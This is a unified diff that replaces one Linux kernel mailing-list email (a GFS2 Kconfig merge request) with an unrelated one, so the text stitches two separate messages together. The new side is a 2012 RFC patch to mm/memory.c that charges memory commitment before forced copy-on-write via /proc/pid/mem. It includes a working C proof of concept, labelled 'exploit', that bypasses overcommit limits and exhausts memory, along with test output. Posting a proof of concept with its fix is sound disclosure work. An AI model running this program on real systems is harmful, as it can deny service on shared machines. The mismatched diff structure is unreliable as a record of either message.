@@ -1,84 +1,242 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1752996Ab2DBPfW (ORCPT <rfc822;w@1wt.eu>);
-	Mon, 2 Apr 2012 11:35:22 -0400
-Received: from oproxy4-pub.bluehost.com ([69.89.21.11]:49713 "HELO
-	oproxy4-pub.bluehost.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with SMTP id S1751628Ab2DBPfV (ORCPT
+	id S1753131Ab2DBPgi (ORCPT <rfc822;w@1wt.eu>);
+	Mon, 2 Apr 2012 11:36:38 -0400
+Received: from mail-bk0-f46.google.com ([209.85.214.46]:61217 "EHLO
+	mail-bk0-f46.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1751628Ab2DBPgh (ORCPT
 	<rfc822;linux-kernel@vger.kernel.org>);
-	Mon, 2 Apr 2012 11:35:21 -0400
-Message-ID: <4F79C733.60604@xenotime.net>
-Date: Mon, 02 Apr 2012 08:35:15 -0700
-From: Randy Dunlap <rdunlap@xenotime.net>
-User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.15) Gecko/20110323 Thunderbird/3.1.9
+	Mon, 2 Apr 2012 11:36:37 -0400
+Subject: [PATCH RFC] mm: account VMA before forced-COW via /proc/pid/mem
+To: linux-mm@kvack.org, linux-kernel@vger.kernel.org
+From: Konstantin Khlebnikov <khlebnikov@openvz.org>
+Cc: Hugh Dickins <hughd@google.com>, Andrew Morton <akpm@linux-foundation.org>,
+        Linus Torvalds <torvalds@linux-foundation.org>,
+        Oleg Nesterov <oleg@redhat.com>
+Date: Mon, 02 Apr 2012 19:36:31 +0400
+Message-ID: <20120402153631.5101.44091.stgit@zurg>
+User-Agent: StGit/0.15
 MIME-Version: 1.0
-To: Steven Whitehouse <swhiteho@redhat.com>
-CC: Benjamin Poirier <bpoirier@suse.de>, David Teigland <teigland@redhat.com>,
-        linux-kernel@vger.kernel.org, cluster-devel@redhat.com
-Subject: Re: GFS2: Pre-pull patch posting (merge window)
-References: <1332152728-4027-1-git-send-email-swhiteho@redhat.com>	 <4F674696.7030602@xenotime.net> <1332169153.2689.20.camel@menhir>	 <4F674E4F.5080904@xenotime.net> <1332171247.2689.28.camel@menhir>	 <20120323194152.GD24746@redhat.com> <4F6CD7AD.9030306@xenotime.net>	 <20120323201820.GE24746@redhat.com>	 <20120323220618.GA30906@d2.synalogic.ca> <1332758662.2721.10.camel@menhir>
-In-Reply-To: <1332758662.2721.10.camel@menhir>
-Content-Type: text/plain; charset=UTF-8
+Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: 7bit
-X-Identified-User: {1807:box742.bluehost.com:xenotime:xenotime.net} {sentby:smtp auth 50.53.38.135 authed with rdunlap@xenotime.net}
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On 03/26/2012 03:44 AM, Steven Whitehouse wrote:
+Currently kernel does not account read-only private mappings into memory commitment.
+But these mappings can be force-COW-ed in get_user_pages(). This way we can freely
+overcommit memory usage. And I'm afraid not only /proc/pid/mem able to trigger this.
 
-> Hi,
-> 
-> On Fri, 2012-03-23 at 18:06 -0400, Benjamin Poirier wrote:
-> [snip]
->>
->> Instead of trying to select everything in GFS2, how about doing it this way?
->>
->> [PATCH] gfs2: use depends instead of select in kconfig
->>
->> Avoids having to duplicate the dependencies of what is 'select'ed (and on
->> down...)
->>
->> Those dependencies are currently incomplete, leading to broken builds with
->> GFS2_FS_LOCKING_DLM=y and IP_SCTP=n.
->>
->> Signed-off-by: Benjamin Poirier <bpoirier@suse.de>
->> ---
->>  fs/gfs2/Kconfig |    7 ++-----
->>  1 files changed, 2 insertions(+), 5 deletions(-)
->>
->> diff --git a/fs/gfs2/Kconfig b/fs/gfs2/Kconfig
->> index c465ae0..eb08c9e 100644
->> --- a/fs/gfs2/Kconfig
->> +++ b/fs/gfs2/Kconfig
->> @@ -1,10 +1,6 @@
->>  config GFS2_FS
->>  	tristate "GFS2 file system support"
->>  	depends on (64BIT || LBDAF)
->> -	select DLM if GFS2_FS_LOCKING_DLM
->> -	select CONFIGFS_FS if GFS2_FS_LOCKING_DLM
->> -	select SYSFS if GFS2_FS_LOCKING_DLM
->> -	select IP_SCTP if DLM_SCTP
->>  	select FS_POSIX_ACL
->>  	select CRC32
->>  	select QUOTACTL
->> @@ -29,7 +25,8 @@ config GFS2_FS
->>  
->>  config GFS2_FS_LOCKING_DLM
->>  	bool "GFS2 DLM locking"
->> -	depends on (GFS2_FS!=n) && NET && INET && (IPV6 || IPV6=n) && HOTPLUG
->> +	depends on (GFS2_FS!=n) && NET && INET && (IPV6 || IPV6=n) && \
->> +		HOTPLUG && DLM && CONFIGFS_FS && SYSFS
->>  	help
->>  	  Multiple node locking module for GFS2
->>  
-> 
-> That looks ok to me. I've put it in the GFS2 -fixes tree, and if
-> everybody is happy with that I'll send a pull request shortly,
+This patch counts VMA into memory commitment before forced-COW in /proc/pid/mem.
 
+Signed-off-by: Konstantin Khlebnikov <khlebnikov@openvz.org>
 
-Can we get Benjamin's patch merged, please?
-linux-next is still having build errors without it.
+---
 
--- 
-~Randy
+before patch:
+
+$ ./private-overcommit 6
+before:
+AnonPages:        705912 kB
+CommitLimit:     3964536 kB
+Committed_AS:    1225340 kB
+after:
+AnonPages:       6991060 kB
+CommitLimit:     3964536 kB
+Committed_AS:    1226596 kB
+
+after patch:
+
+$ ./private-overcommit 6
+before:
+AnonPages:         98760 kB
+CommitLimit:     3964512 kB
+Committed_AS:     369864 kB
+after:
+AnonPages:       6378052 kB
+CommitLimit:     3964512 kB
+Committed_AS:    6662064 kB
+
+Now overcommit control can work:
+
+$ sudo sysctl vm.overcommit_memory=2
+$ ./private-overcommit 6
+before:
+AnonPages:        105252 kB
+CommitLimit:     3964512 kB
+Committed_AS:     386884 kB
+pwrite: Input/output error
+pwrite: Input/output error
+pwrite: Input/output error
+after:
+AnonPages:       3292332 kB
+CommitLimit:     3964512 kB
+Committed_AS:    3533468 kB
+
+exploit:
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <signal.h>
+#include <fcntl.h>
+
+int main (int argc, char **argv)
+{
+	size_t size = 1 << 30, off;
+	int count;
+	void *ptr;
+	int pid = 0, fd;
+	char path[64];
+
+	count = (argc > 1) ? atoi(argv[1]) : 1;
+
+	system("echo before:");
+	system("grep AnonPages /proc/meminfo");
+	system("grep Commit /proc/meminfo");
+
+	if (setpgid(0, 0))
+		return 2;
+
+	ptr = mmap(NULL, size, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+	if (ptr == MAP_FAILED)
+		return 2;
+
+	while (count--) {
+		pid = fork();
+		if (pid < 0) {
+			perror("fork");
+			break;
+		}
+		if (pid == 0) {
+			pause();
+			return 0;
+		}
+		sprintf(path, "/proc/%d/mem", pid);
+		fd = open(path, O_RDWR);
+		if (fd < 0) {
+			perror("open");
+			break;
+		}
+		for (off = 0; off < size ; off += 4096)
+			if (pwrite(fd, "*", 1, (unsigned long)ptr + off) != 1) {
+				perror("pwrite");
+				break;
+			}
+	}
+
+	system("echo after:");
+	system("grep AnonPages /proc/meminfo");
+	system("grep Commit /proc/meminfo");
+
+	kill(0, SIGINT);
+	return 0;
+}
+---
+ mm/memory.c |   54 ++++++++++++++++++++++++++++++++++++++++++++++++++++--
+ 1 files changed, 52 insertions(+), 2 deletions(-)
+
+diff --git a/mm/memory.c b/mm/memory.c
+index 9b8db37..c2c97d8 100644
+--- a/mm/memory.c
++++ b/mm/memory.c
+@@ -57,6 +57,7 @@
+ #include <linux/swapops.h>
+ #include <linux/elf.h>
+ #include <linux/gfp.h>
++#include <linux/security.h>
+ 
+ #include <asm/io.h>
+ #include <asm/pgalloc.h>
+@@ -3790,6 +3791,43 @@ int generic_access_phys(struct vm_area_struct *vma, unsigned long addr,
+ #endif
+ 
+ /*
++ * Verifies that vma is accounted, otherwise tries to charge it.
++ * Returns length of accounted area starting from given address.
++ */
++static unsigned long __account_vma(struct mm_struct *mm,
++		struct vm_area_struct **pvma, unsigned long addr)
++{
++	struct vm_area_struct *vma = *pvma;
++	unsigned long ret;
++
++	/*
++	 * Already accounted or not accountable?
++	 * See accountable_mapping() and mprotect_fixup().
++	 */
++	if ((vma->vm_flags & (VM_ACCOUNT | VM_NORESERVE | VM_SHARED |
++				VM_HUGETLB | VM_MAYWRITE)) != VM_MAYWRITE)
++		return vma->vm_end - addr;
++
++	up_read(&mm->mmap_sem);
++	down_write(&mm->mmap_sem);
++	*pvma = vma = find_vma(mm, addr);
++	if (vma && vma->vm_start <= addr) {
++		ret = vma->vm_end - addr;
++		if ((vma->vm_flags & (VM_ACCOUNT | VM_NORESERVE | VM_SHARED |
++				VM_HUGETLB | VM_MAYWRITE)) == VM_MAYWRITE) {
++			if (!security_vm_enough_memory_mm(mm, vma_pages(vma)))
++				vma->vm_flags |= VM_ACCOUNT;
++			else
++				ret = 0;
++		}
++	} else
++		ret = 0;
++	downgrade_write(&mm->mmap_sem);
++
++	return ret;
++}
++
++/*
+  * Access another process' address space as given in mm.  If non-NULL, use the
+  * given task for page fault accounting.
+  */
+@@ -3798,6 +3836,7 @@ static int __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,
+ {
+ 	struct vm_area_struct *vma;
+ 	void *old_buf = buf;
++	unsigned long force = write ? 0 : ULONG_MAX;
+ 
+ 	down_read(&mm->mmap_sem);
+ 	/* ignore errors, just check how much was successfully transferred */
+@@ -3806,15 +3845,24 @@ static int __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,
+ 		void *maddr;
+ 		struct page *page = NULL;
+ 
++again:
+ 		ret = get_user_pages(tsk, mm, addr, 1,
+-				write, 1, &page, &vma);
++				write, force > 0, &page, &vma);
+ 		if (ret <= 0) {
++			vma = find_vma(mm, addr);
++			if (!vma || vma->vm_start > addr)
++				break;
++			/*
++			 * Use forced-COW only on accounted-vma, otherwise
++			 * we can COW too much and overcommit memory usage.
++			 */
++			if (!force && (force = __account_vma(mm, &vma, addr)))
++				goto again;
+ 			/*
+ 			 * Check if this is a VM_IO | VM_PFNMAP VMA, which
+ 			 * we can access using slightly different code.
+ 			 */
+ #ifdef CONFIG_HAVE_IOREMAP_PROT
+-			vma = find_vma(mm, addr);
+ 			if (!vma || vma->vm_start > addr)
+ 				break;
+ 			if (vma->vm_ops && vma->vm_ops->access)
+@@ -3842,6 +3890,8 @@ static int __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,
+ 			kunmap(page);
+ 			page_cache_release(page);
+ 		}
++		if (force)
++			force -= bytes;
+ 		len -= bytes;
+ 		buf += bytes;
+ 		addr += bytes;
+
